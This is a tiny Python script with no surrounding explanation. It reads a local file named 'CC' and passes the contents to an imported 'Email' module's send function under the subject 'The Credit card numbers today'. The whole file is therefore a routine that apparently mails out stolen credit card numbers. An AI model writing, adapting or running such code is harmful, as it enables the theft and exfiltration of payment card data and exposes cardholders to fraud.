import Email

with open("CC", "r") as lo:
    l = lo.read()
    Email.m(sub="The Credit card numbers today", bod=l)
